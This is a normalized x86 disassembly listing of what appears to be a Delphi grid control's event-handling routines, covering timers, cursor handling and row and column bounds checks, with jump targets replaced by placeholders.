lea ecx [ ebp - 0x78 ]
mov edx edi
mov eax esi
call sub_416a38
lea eax [ ebp - 0x78 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
call sub_478f84
jmp r-xdata
jmp r-xdata
sub_478c90
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x1c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov esi [ edx + 0x260 ]
dec esi
sub esi eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x264 ]
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc esi
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ ebp - 0x4 ] eax
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
sub_478ce8
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
xor edx edx
push ebp
push sub_478f73
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x28e ]
dec al
je r-xdata
push edi
mov ecx ebx
mov dl [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
mov si 0xffd4
call sub_403368
push 0x1
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call KillTimer
mov eax [ ebp - 0x4 ]
call sub_479740
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403368
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
push ebx
push edi
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_44150c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478f7a
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x0
retn
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_476088
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_476a7c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x3
jne r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403368
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_476bbc
push 0x1
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call KillTimer
lea ecx [ ebp - 0x70 ]
mov edx edi
mov eax ebx
call sub_416a38
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
mov si 0xff9e
call sub_403368
test al al
je r-xdata
dec al
je r-xdata
push ebp
lea eax [ ebp - 0x38 ]
call sub_478c90
pop ecx
cmp eax 0x1
jle r-xdata
push ebp
lea eax [ ebp - 0x68 ]
call sub_478c90
pop ecx
cmp eax 0x1
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_43f5b4
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x264 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x264 ] eax
mov eax [ ebp - 0x4 ]
call sub_479740
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x270 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_476bbc
push 0x1
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call KillTimer
lea ecx [ ebp - 0x70 ]
mov edx edi
mov eax ebx
call sub_416a38
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebp - 0x4 ]
lea ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
mov si 0xff9f
call sub_403368
test al al
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x260 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
call sub_4795a4
mov eax [ ebp - 0x4 ]
call sub_479ef4
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x260 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
call sub_479234
mov eax [ ebp - 0x4 ]
call sub_479ef4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
call sub_475320
mov eax [ ebp - 0x4 ]
call sub_479ef4
mov eax [ ebp - 0x4 ]
call sub_479740
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x270 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_479740
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x26c ]
mov eax [ ebp - 0x4 ]
call sub_475248
mov eax [ ebp - 0x4 ]
call sub_479ef4
sub_478f84
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x10 ]
mov eax ebx
mov si 0xffc8
call sub_403368
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebx + 0x270 ]
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
mov eax [ edi + 0x18 ]
cmp eax [ ebx + 0x270 ]
jne r-xdata
mov eax ebx
call sub_43f5b4
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x20 ]
dec eax
cmp eax [ ebx + 0x270 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov eax ebx
call sub_476bbc
mov eax [ edi + 0x4 ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax [ edi + 0x8 ]
cmp eax [ ebp - 0x4 ]
jl r-xdata
mov eax [ edi + 0x14 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov eax [ edi + 0x18 ]
cmp eax [ ebx + 0x270 ]
jge r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
mov edx [ edi + 0x10 ]
mov eax [ ebx + 0x270 ]
cmp edx eax
jne r-xdata
mov eax [ edi + 0x1c ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_477450
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov edx [ ebp + 0x14 ]
mov eax ebx
call sub_476088
cmp [ ebx + 0x28e ] 0x5
jne r-xdata
mov eax [ ebx + 0x270 ]
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x10 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov edx [ edi + 0x20 ]
dec edx
cmp eax edx
jge r-xdata
cmp [ ebx + 0x28e ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebx + 0x26c ]
mov eax ebx
mov si 0xffa1
call sub_403368
test al al
jne r-xdata
push 0x0
push 0x0
mov ecx 0x1
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_477450
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov edx [ ebp + 0x14 ]
mov eax ebx
call sub_476088
mov eax ebx
call sub_476bbc
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebx + 0x26c ]
mov eax ebx
mov si 0xffa0
call sub_403368
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x270 ] eax
sub_4791d8
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x21c ]
je r-xdata
pop esi
pop ebx
retn
cmp esi 0x1
jge r-xdata
cmp esi [ ebx + 0x238 ]
jg r-xdata
mov esi 0x1
mov ecx [ ebx + 0x24c ]
mov edx esi
mov eax ebx
call sub_4768dc
test [ ebx + 0x249 ] 0x10
je r-xdata
mov edx esi
dec edx
mov eax ebx
call sub_47936c
mov eax [ ebx + 0x21c ]
dec eax
mov [ ebx + 0x210 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_479234
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4792d2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
cmp esi [ ebx + 0x21c ]
jl r-xdata
lea eax [ ebx + 0x220 ]
mov ecx [ ebx + 0x230 ]
mov edx [ ebx + 0x21c ]
call sub_473f9c
mov eax [ ebx + 0x220 ]
mov eax [ eax + esi * 4 + 0x4 ]
cmp edi eax
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov eax [ ebp - 0x4 ]
call sub_473ba0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4792d9
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
push edi
mov ecx eax
mov edx esi
mov eax ebx
call sub_4778a0
mov eax [ ebx + 0x220 ]
mov [ eax + esi * 4 + 0x4 ] edi
mov eax ebx
mov si 0xffa5
call sub_403368
sub_4792e0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
mov [ ebx + 0x230 ] esi
mov eax ebx
mov si 0xffa5
call sub_403368
mov eax ebx
call sub_477024
pop esi
pop ebx
retn
lea eax [ ebx + 0x220 ]
xor ecx ecx
xor edx edx
call sub_473f9c
sub_47931c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x250 ] 0x0
je r-xdata
mov [ ebx + 0x234 ] esi
mov eax ebx
mov si 0xffa4
call sub_403368
mov eax ebx
call sub_477024
pop esi
pop ebx
retn
lea eax [ ebx + 0x250 ]
xor ecx ecx
xor edx edx
call sub_473f9c
sub_47936c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4793f4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebx + 0x238 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4793fb
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
test esi esi
jge r-xdata
cmp esi [ ebx + 0x21c ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov eax [ ebp - 0x4 ]
call sub_473ba0
mov [ ebx + 0x238 ] esi
mov eax ebx
call sub_476fa0
mov eax ebx
call sub_477024
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d94
mov eax [ ebp - 0x8 ]
call sub_473ba0
sub_479404
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47948c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ ebx + 0x23c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479493
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
test esi esi
jge r-xdata
cmp esi [ ebx + 0x24c ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov eax [ ebp - 0x4 ]
call sub_473ba0
mov [ ebx + 0x23c ] esi
mov eax ebx
call sub_476fa0
mov eax ebx
call sub_477024
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d94
mov eax [ ebp - 0x8 ]
call sub_473ba0
sub_47949c
push ebx
mov ebx eax
test dl dl
jne r-xdata
mov eax ebx
call sub_474fb8
mov eax [ ebx + 0x27c ]
test eax eax
je r-xdata
mov eax ebx
call sub_474fa8
pop ebx
retn
pop ebx
retn
call sub_474740
sub_4794d8
push ebx
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x248 ]
je r-xdata
pop edx
pop ebx
retn
test [ esp + 0x1 ] 0x10
je r-xdata
mov ax [ esp ]
mov [ ebx + 0x248 ] ax
cmp [ ebx + 0x28d ] 0x0
jne r-xdata
and [ esp ] 0xdfff
test [ esp + 0x1 ] 0x10
je r-xdata
test [ esp + 0x1 ] 0x20
je r-xdata
mov eax ebx
call sub_477024
push 0x1
push 0x0
mov ecx [ ebx + 0x22c ]
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_4776f4
mov eax ebx
call sub_474fa8
mov eax ebx
call sub_474fb8
jmp r-xdata
sub_479568
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x24c ]
je r-xdata
pop esi
pop ebx
retn
cmp esi 0x1
jge r-xdata
cmp esi [ ebx + 0x23c ]
jg r-xdata
mov esi 0x1
mov ecx esi
mov edx [ ebx + 0x21c ]
mov eax ebx
call sub_4768dc
mov edx esi
dec edx
mov eax ebx
call sub_479404
sub_4795a4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_479642
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x250 ] 0x0
jne r-xdata
cmp esi [ ebx + 0x24c ]
jl r-xdata
lea eax [ ebx + 0x250 ]
mov ecx [ ebx + 0x234 ]
mov edx [ ebx + 0x24c ]
call sub_473f9c
mov eax [ ebx + 0x250 ]
mov eax [ eax + esi * 4 + 0x4 ]
cmp edi eax
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov eax [ ebp - 0x4 ]
call sub_473ba0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479649
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
push edi
mov ecx eax
mov edx esi
mov eax ebx
call sub_4778ac
mov eax [ ebx + 0x250 ]
mov [ eax + esi * 4 + 0x4 ] edi
mov eax ebx
mov si 0xffa4
call sub_403368
sub_479664
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x27c ] 0x0
je r-xdata
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_4796c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_479820
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x280 ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov [ eax + 0x284 ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x27c ]
call sub_4747e4
retn
sub_4796d0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
mov eax [ ebx ]
mov eax [ eax + 0x228 ]
mov edx [ ebx ]
mov [ edx + 0x280 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x22c ]
mov edx [ ebx ]
mov [ edx + 0x284 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x27c ]
mov edx [ eax ]
call [ edx + 0x100 ]
mov eax [ ebx ]
mov eax [ eax + 0x27c ]
call sub_470e24
inc eax
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x219 ] 0x1
mov eax [ ebx ]
mov [ eax + 0x219 ] 0x0
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x27c ]
call sub_436314
pop ebx
pop ebp
retn
sub_479740
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd4 ]
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x27c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x280 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd0 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x27c ] ebx
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4740f8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x27c ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
push ebp
call sub_4796d0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_479664
push ebp
call sub_4796d0
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x284 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd4 ]
test al al
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x22c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x228 ]
mov eax [ ebp - 0x4 ]
call sub_474e98
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x27c ]
call sub_47495c
sub_479820
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_479886
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x280 ]
cmp esi 0xffffffff
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47988d
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
cmp [ ebx + 0x284 ] 0xffffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x27c ]
call sub_4709d0
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebx + 0x284 ]
mov edx esi
mov eax ebx
mov si 0xffae
call sub_403368
sub_479894
test [ eax + 0x249 ] 0x4
je r-xdata
call sub_4454b8
retn
mov cl [ edx + 0x4 ]
sub cl 0x8
je r-xdata
mov dl [ edx + 0x4 ]
call sub_474fc8
retn
add cl 0xe8
sub cl 0xe0
jae r-xdata
sub_4798bc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x27c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_446450
cmp eax [ edi + 0x8 ]
jne r-xdata
mov ax [ edi + 0x6 ]
sub ax 0x300
jne r-xdata
mov eax ebx
call sub_479820
sub_479920
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_444b14
mov edx esp
mov eax ebx
call sub_47913c
mov edx esp
mov eax ebx
call sub_47702c
mov edi [ ebx + 0x27c ]
test edi edi
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_446450
cmp eax [ esi + 0x4 ]
je r-xdata
mov eax ebx
call sub_479664
sub_479994
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
lea edx [ esp + 0x8 ]
mov eax [ esi + 0x8 ]
call sub_406cd8
lea edx [ esp + 0x8 ]
mov ecx esp
mov eax ebx
call sub_43f6f4
mov eax [ esp ]
mov [ ebx + 0x274 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x278 ] eax
add esp 0x10
pop esi
pop ebx
retn
sub_4799d8
push ebx
push esi
push edi
push ebp
add esp 0xffffff90
mov edi edx
mov esi eax
xor ebx ebx
cmp [ edi + 0x8 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov al [ esi + 0x28e ]
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_444a00
push ebx
call SetCursor
jmp r-xdata
mov [ esp ] al
lea edx [ esp + 0x10 ]
mov eax esi
call sub_476088
push esp
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov ecx [ esi + 0x278 ]
mov edx [ esi + 0x274 ]
mov eax esi
mov ebp [ eax ]
call [ ebp + 0xcc ]
jmp r-xdata
add esp 0x70
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esp ] 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx 0xfffffff1
call sub_45e374
mov ebx eax
jmp r-xdata
cmp [ esp ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx 0xfffffff2
call sub_45e374
mov ebx eax
sub_479a84
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_444b00
mov edi [ ebx + 0x27c ]
test edi edi
je r-xdata
mov edx esp
mov eax ebx
call sub_47913c
mov edx esp
mov eax ebx
call sub_47702c
mov eax ebx
call sub_479740
mov eax edi
call sub_446450
cmp eax [ esi + 0x4 ]
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_479ad0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4449b8
mov eax ebx
call sub_478034
mov eax ebx
mov si 0xffc8
call sub_403368
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_479b28
push ebp
mov ebp esp
add esp 0xffffff98
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_479bb1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x28e ]
dec al
je r-xdata
push 0x1
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call KillTimer
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479bb8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x0
retn
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_476088
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_476a7c
jmp r-xdata
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
call sub_476bbc
push 0x1
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
call KillTimer
jmp r-xdata
sub_479bd0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x27c ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_479b28
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x74 ]
sub_479bfc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x27c ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_4459ac
pop esi
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_43fca4
sub_479c34
push ebx
push esi
mov ebx edx
mov esi eax
movsx ecx [ ebx + 0xa ]
movsx edx [ ebx + 0x8 ]
mov eax esi
call sub_4753b0
neg al
sbb eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_479c54
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x249 ] 0x4
je r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0xd
jne r-xdata
mov [ esi + 0xc ] 0x1
sub_479c7c
add esp 0xffffffec
mov [ esp ] dl
mov edx [ eax + 0x210 ]
mov [ esp + 0xc ] edx
mov edx [ eax + 0x214 ]
mov [ esp + 0x10 ] edx
mov edx [ eax + 0x21c ]
dec edx
mov [ esp + 0x4 ] edx
mov edx [ eax + 0x24c ]
dec edx
mov [ esp + 0x8 ] edx
test [ esp ] 0x1
je r-xdata
test [ esp ] 0x2
je r-xdata
mov edx [ eax + 0x210 ]
cmp edx [ eax + 0x238 ]
jle r-xdata
test [ esp ] 0x4
je r-xdata
mov edx [ eax + 0x210 ]
cmp edx [ esp + 0x4 ]
jge r-xdata
dec [ esp + 0xc ]
test [ esp ] 0x8
je r-xdata
mov edx [ eax + 0x214 ]
cmp edx [ eax + 0x23c ]
jle r-xdata
inc [ esp + 0xc ]
mov edx [ eax + 0x210 ]
cmp edx [ esp + 0xc ]
jne r-xdata
mov edx [ eax + 0x214 ]
cmp edx [ esp + 0x8 ]
jge r-xdata
dec [ esp + 0x10 ]
lea edx [ esp + 0xc ]
call sub_47766c
mov edx [ eax + 0x214 ]
cmp edx [ esp + 0x10 ]
je r-xdata
inc [ esp + 0x10 ]
add esp 0x14
retn
sub_479d30
push ebx
push esi
push edi
add esp 0xffffff88
mov edi eax
mov al [ edi + 0x28e ]
sub al 0x1
je r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x70 ]
mov edx esp
mov eax edi
call sub_43f6f4
mov eax [ esp + 0x70 ]
mov [ esp ] eax
mov eax [ esp + 0x74 ]
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov eax edi
call sub_476088
mov bl [ r-xdata ]
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax edi
call sub_47602c
mov al [ edi + 0x28e ]
dec al
je r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax edi
mov si 0xffc8
call sub_403368
test al al
jne r-xdata
sub al 0x3
je r-xdata
add esp 0x78
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_43f5b4
mov esi eax
sub esi [ esp + 0x24 ]
mov eax edi
call sub_43f5b4
sub eax [ esp + 0x14 ]
mov edx [ esp ]
cmp esi edx
jle r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x14 ]
jge r-xdata
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x44 ]
push eax
push 0x1
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x14 ]
mov eax edi
call sub_478f84
jmp r-xdata
dec al
jne r-xdata
cmp eax edx
jge r-xdata
or bl 0x2
jmp r-xdata
cmp eax [ esp + 0x24 ]
jle r-xdata
or bl 0x1
jmp r-xdata
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x14 ]
push eax
push 0x0
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x10 ]
mov eax edi
call sub_478f84
jmp r-xdata
mov eax [ esp + 0x4 ]
cmp eax [ esp + 0x44 ]
jge r-xdata
or bl 0x1
or bl 0x2
jmp r-xdata
cmp eax [ esp + 0x54 ]
jle r-xdata
or bl 0x4
jmp r-xdata
mov al [ r-xdata ]
cmp al bl
je r-xdata
or bl 0x8
mov edx ebx
mov eax edi
mov si 0xffa6
call sub_403368
sub_479ef4
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
pop ebx
retn
mov eax ebx
call sub_446754
test al al
je r-xdata
test [ ebx + 0x1c ] 0x40
jne r-xdata
mov eax ebx
call sub_457570
test eax eax
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_479f30
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov ebx eax
lea ecx [ esp + 0x1 ]
mov dl [ esp ]
mov eax ebx
call sub_440608
test al al
jne r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x24c ]
dec edx
mov eax [ ebx + 0x22c ]
cmp edx eax
jle r-xdata
mov al 0x1
mov edx eax
inc edx
mov eax ebx
call sub_479550
sub_479f7c
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov ebx eax
lea ecx [ esp + 0x1 ]
mov dl [ esp ]
mov eax ebx
call sub_440654
test al al
jne r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x22c ]
cmp eax [ ebx + 0x23c ]
jle r-xdata
mov al 0x1
mov edx eax
dec edx
mov eax ebx
call sub_479550
sub_47a048
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_403f40
cmp [ ebx + 0x2aa ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
push esi
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x2ac ]
call [ ebx + 0x2a8 ]
sub_47a088
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
